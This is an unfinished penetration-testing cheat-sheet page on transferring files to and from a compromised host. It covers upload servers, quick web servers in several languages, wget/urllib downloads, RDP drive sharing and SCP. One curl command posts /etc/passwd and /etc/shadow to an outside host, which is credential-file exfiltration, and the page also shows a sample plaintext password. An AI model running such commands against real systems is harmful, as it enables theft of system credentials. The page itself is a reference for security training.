# Data Transfer

<mark style="background-color:red;">This chapter is in-progress.</mark>

<mark style="color:blue;">Check the index on the right to navigate this page more easily.</mark>

## Program Upload

#### Uploadserver

<pre><code><strong># Download Uploadserver
</strong><strong>sudo python3 -m pip install --user uploadserver
</strong><strong># Create a self-signed certificate
</strong>openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
# Make webroot
mkdir https &#x26;&#x26; cd https
# Start web service
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
# Uploading multiple files via curl
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
</code></pre>

**Creating a Web Server with Python3**

```
python3 -m http.server (default port 80 change port with -p)
```

**Creating a Web Server with Python2.7**

```
python2.7 -m SimpleHTTPServer
```

**Creating a Web Server with PHP**

```
php -S 0.0.0.0:8000
```

**Creating a Web Server with Ruby**

```
ruby -run -ehttpd . -p8000
```

**Using Python3**

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://acuity.io/repository/getsmart.sh", "getsmart.sh")'
```

**Using wget**

```
wget 192.168.49.128:8000/filetotransfer.txt
```

```
xfreerdp /v:1.2.3.4 /u:acuity /p:"SuperStr00ng!" /drive:linux,/home/acuity/share
```

### SCP File Operations

#### Uploading Files

```
scp /home/acuity/file.txt acuity@$IP:/home/hacked/file.txt
```
